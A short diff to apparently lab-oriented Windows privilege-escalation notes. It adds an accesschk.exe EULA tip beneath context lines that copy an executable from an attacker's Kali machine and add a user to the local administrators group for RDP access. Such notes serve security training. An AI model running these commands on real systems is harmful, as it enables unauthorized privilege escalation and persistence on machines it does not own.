@@ -577,3 +577,7 @@ copy \\<ip of your kali machine>\kali\yourfile.exe C:\PrivEsc\yourfile.exe
 
 Add your user to administrator group and login thorugh rdp:
 net localgroup administrators user /add ;)
+
+Accept the eula from command line for accesschk.exe:
+accesschk.exe /accepteula 
+
